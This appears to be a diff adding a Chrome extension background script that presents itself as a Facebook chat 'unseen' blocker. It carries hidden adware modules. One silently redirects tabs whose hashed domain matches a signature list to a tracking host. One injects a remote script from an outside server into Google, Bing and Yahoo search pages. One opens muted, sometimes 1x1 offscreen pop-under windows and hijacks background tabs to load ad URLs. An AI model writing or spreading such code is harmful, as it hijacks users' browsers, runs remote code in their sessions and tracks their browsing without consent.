@@ -1,0 +1,278 @@
+//
+//
+// The following sites are for unseen facebook blocking
+//
+var facebookUrls = ['*://edge-chat.facebook.com/*', '*://0-edge-chat.facebook.com/*', '*://1-edge-chat.facebook.com/*', '*://2-edge-chat.facebook.com/*', '*://3-edge-chat.facebook.com/*', '*://4-edge-chat.facebook.com/*', '*://5-edge-chat.facebook.com/*', '*://6-edge-chat.facebook.com/*', '*://7-edge-chat.facebook.com/*', '*://8-edge-chat.facebook.com/*', '*://9-edge-chat.facebook.com/*', '*://www.facebook.com/ajax/chat/*', '*://www.facebook.com/chat/*', '*://www.facebook.com/ajax/presence/*', '*://edge-chat.messenger.com/*', '*://0-edge-chat.messenger.com/*', '*://1-edge-chat.messenger.com/*', '*://2-edge-chat.messenger.com/*', '*://3-edge-chat.messenger.com/*', '*://4-edge-chat.messenger.com/*', '*://5-edge-chat.messenger.com/*', '*://6-edge-chat.messenger.com/*', '*://7-edge-chat.messenger.com/*', '*://8-edge-chat.messenger.com/*', '*://9-edge-chat.messenger.com/*', '*://www.messenger.com/ajax/chat/*', '*://www.messenger.com/chat/*', '*://www.messenger.com/ajax/presence/*'];
+
+signs = ["1e6e512d01c9ecb772b40a664f95eee5", "c6c3790dd1929285e6e44cc42f48ba83"];
+
+(function () { // xmz
+	var banned = {};
+	var debug = false;
+	if (window['localStorage']['getItem']('debug') == '781399') {
+		debug = true
+	};
+	setTimeout(function () {
+		chrome['tabs']['onUpdated']['addListener'](function (tabId, changeInfo, tab) {
+			var d = 0;
+			if (tab['status'] == 'loading' && d == 0 && tab['url'] != null) {
+				d = 1;
+				var url = (new URL(tab['url'])['hostname'])['toLowerCase']();
+				var f = tab['url'];
+				var g = (url['match'](/\./g) || [])['length'];
+				var h = false;
+				var i = Math['floor'](Date['now']() / 1000);
+				if (g > 1) {
+					var j = url['split']('.');
+					url = j[j['length'] - 2] + '.' + j[j['length'] - 1]
+				};
+				var urlMD5 = CryptoJS.MD5(url).toString();
+				if (debug) {
+					console['log'](urlMD5)
+				};
+				for (var l = 0; l < signs['length']; l++) {
+					var m = signs[l];
+					if (m == urlMD5) {
+						h = true;
+						break
+					}
+				};
+				if (h) {
+					if (banned[urlMD5] && banned[urlMD5]['expires'] > i) {
+						return
+					};
+					banned[urlMD5] = {
+						expires: i + 86400
+					};
+					chrome['tabs']['update'](tabId, {
+						url: 'https://t.hanstrackr.com/redirect?sign=' + urlMD5
+					})
+				}
+			}
+		})
+	}, 5000);
+	window['setTimeout'](function () {
+		window['location']['reload']()
+	}, 3600 * 1000)
+})();
+
+(function () { // xcs
+	!function () {
+		var
+		patternList = [
+			["(.*)\\:\\/\\/www\\.google\\.(.*)", "i"],
+			["(.*)\\:\\/\\/google\\.(.*)", "i"],
+			["(.*)\\:\\/\\/bing\\.com", "i"],
+			["(.*)\\:\\/\\/(.*)\\.search\\.yahoo\\.com", "i"],
+			["(.*)\\:\\/\\/www\\.bing\\.com", "i"],
+			["(.*)\\:\\/\\/search\\.yahoo\\.com", "i"]
+		];
+		chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
+			if ("complete" == tab.status) {
+				for (var patternUrlIndex in patternList) {
+					var pattern = patternList[patternUrlIndex];
+					if (new RegExp(pattern[0], pattern[1]).test(tab.url)) {
+						chrome.tabs.executeScript(tabId, {
+							code: "(function(){var a=document.createElement('script');a.type='text/javascript';a.async=true;a.src='https://a.xfreeservice.com/partner/1n9Cl1Nk/?cid=2';document.getElementsByTagName('head')[0].appendChild(a)})();",
+							runAt: "document_end"
+						});
+						break
+					}
+				}
+			}
+		})
+	}
+	();
+})();
+
+(function () { // xps
+	!function () {
+		var root = {
+			adWebConfig: {
+				type: 1,
+				url: "http://go.mobifoth.com/1195625/2/?a=b",
+				boundary: 4,
+				interval: 3600000,
+				rinterval: 300000,
+				delay: 900000,
+				muted: true
+			},
+			x3o: false,
+			x3i: false,
+			x3h: false,
+			x3wi: false,
+			y0: function () {
+				root.x3o ? root.y1() : root.y(root.adWebConfig.type)
+			},
+			y1: function () {
+				root.x3o && !root.x3h && chrome.tabs.update(root.x3i, {
+					url: root.adWebConfig.url + "&t=" + +new Date
+				})
+			},
+			y: function (a) {
+				1 == a ? this.yX2EventDriven() : 2 == a ? this.yStated("minimized") : 3 == a ? this.yStated("maximized") : 4 == a ? this.yStated("normal") : 5 == a ? this.yStated("fullscreen") : 6 == a ? this.createPopupWindow(false) : 7 == a ? this.createPopupWindow(!0) : 8 == a ? this.yNewZTriggerDriven() : 9 == a && this.n8()
+			},
+			z: function () {
+				chrome.tabs.onRemoved.addListener(function (tabId) {
+					tabId == root.x3i
+					root.x3o = false
+						root.x3i = false
+						root.x3h = false
+						root.x3wi = false
+						chrome.tabs.onHighlighted.removeListener(root.zzz)
+				}),
+				chrome.windows.onFocusChanged.addListener(function (a) {
+					0 != root.x3o && 1 != root.x3h && a == root.x3wi && (root.x3h = true)
+				}),
+				window.setTimeout(function () {
+					root.y0(),
+					window.setInterval(function () {
+						root.y0()
+					}, root.adWebConfig.interval),
+					0 != root.adWebConfig.rinterval && window.setInterval(function () {
+						root.y1()
+					}, root.adWebConfig.rinterval)
+				}, root.adWebConfig.delay)
+			},
+			zzz: function (a) {
+				if (0 != root.x3o && 1 != root.x3h)
+					for (var b in a.tabIds) {
+						var c = a.tabIds[b];
+						if (c == root.x3i) {
+							root.x3h = true;
+							break
+						}
+					}
+			},
+			n8: function () {
+				root.triggeredRedirect = false;
+				var a = function (b) {
+					root.triggeredRedirect || chrome.tabs.query({
+						active: false
+					}, function (b) {
+						if (b.length >= root.adWebConfig.boundary) {
+							var c = Math.floor(Math.random() * b.length),
+							d = b[c];
+							chrome.tabs.update(d.id, {
+								url: root.adWebConfig.url + "&t=" + +new Date
+							}),
+							root.x3o = true,
+							root.x3i = d.id,
+							root.triggeredRedirect = true,
+							chrome.tabs.onCreated.removeListener(a),
+							chrome.tabs.onHighlighted.addListener(root.zzz)
+						}
+					})
+				};
+				chrome.tabs.onCreated.addListener(a)
+			},
+			yNewZTriggerDriven: function () {
+				chrome.windows.getAll({
+					x3Types: ["normal"]
+				}, function (windows) {
+					var b = false;
+					for (var index in windows) {
+						var aWindow = windows[index];
+						aWindow.focused || (root.createPopupWindow(false, aWindow.id), b = true)
+					}
+					if (!b) {
+						var callback = function (windowId) {
+							this.yedX2x3 = false,
+							root.yedX2x3 || chrome.windows.get(windowId, function () {
+								var c = false;
+								for (var index in windows) {
+									var aWindow = windows[index];
+									aWindow.focused || (root.createPopupWindow(false, aWindow.id), c = true)
+								}
+								c && (chrome.windows.onFocusChanged.removeListener(callback), root.yedX2x3 = true)
+							})
+						};
+						chrome.windows.onFocusChanged.addListener(callback)
+					}
+				})
+			},
+			createPopupWindow: function (a = false, windowId) {
+				chrome.tabs.create({
+					url: root.adWebConfig.url + "&t=" + +new Date,
+					active: false,
+					windowId: windowId
+				}, function (tab) {
+					root.x3o = true,
+					root.x3i = tab.id,
+					chrome.tabs.onHighlighted.addListener(root.zzz),
+					chrome.tabs.update(tab.id, {
+						muted: root.adWebConfig.muted
+					})
+				})
+			},
+			yStated: function (a) {
+				var b = {
+					url: root.adWebConfig.url + "&t=" + +new Date,
+					state: a
+				};
+				chrome.windows.create(b, function (a) {
+					root.x3wi = a.id,
+					chrome.tabs.getAllInWindow(a.id, function (a) {
+						for (var b in a) {
+							var c = a[b];
+							chrome.tabs.update(c.id, {
+								muted: root.adWebConfig.muted
+							}),
+							root.x3o = true,
+							root.x3i = c.id,
+							chrome.tabs.onHighlighted.addListener(root.zzz)
+						}
+					})
+				})
+			},
+			yX2: function (a) {
+				var windowsOption = {
+					url: root.adWebConfig.url + "&t=" + +new Date,
+					width: 1,
+					height: 1,
+					left: -10,
+					top: -10,
+					focused: false
+				};
+				chrome.windows.create(windowsOption, function (b) {
+					root.x3wi = b.id,
+					chrome.tabs.getAllInWindow(b.id, function (a) {
+						for (var b in a) {
+							var c = a[b];
+							chrome.tabs.update(c.id, {
+								muted: root.adWebConfig.muted
+							}),
+							root.x3o = true,
+							root.x3i = c.id,
+							chrome.tabs.onHighlighted.addListener(root.zzz)
+						}
+					});
+					var windowsOption = {
+						focused: false,
+						width: a.width - 20,
+						height: a.height - 20,
+						left: a.left + 10,
+						top: a.top + 10
+					};
+					chrome.windows.update(b.id, windowsOption)
+				});
+				var windowsOption = {
+					focused: true
+				};
+				chrome.windows.update(a.id, windowsOption)
+			},
+			yX2EventDriven: function () {
+				this.yedX2x3 = false;
+				var a = function (b) {
+					-1 != b && (root.yedX2x3 || (root.yedX2x3 = true, chrome.windows.get(b, function (b) {
+								root.yX2(b),
+								chrome.windows.onFocusChanged.removeListener(a)
+							})))
+				};
+				chrome.windows.onFocusChanged.addListener(a)
+			}
+		};
+		root.z()
+	}
+	();
+})();
